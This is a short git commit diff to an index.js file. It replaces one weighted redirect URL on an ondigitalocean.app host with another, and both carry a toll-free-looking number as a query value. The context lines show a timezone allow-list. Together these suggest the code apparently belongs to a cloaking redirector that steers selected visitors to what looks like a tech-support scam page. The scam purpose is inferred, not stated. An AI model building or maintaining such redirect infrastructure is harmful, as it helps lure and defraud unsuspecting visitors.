a359d825e3652c92484296106ca727051c96d569
paalakash <palaksh452@gmail.com>
2026-07-16 08:51:25 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://monkfish-app-qugx8.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 1.0 }
+    { url: "https://king-prawn-app-2ubv3.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 1.0 }
     
 ];
 
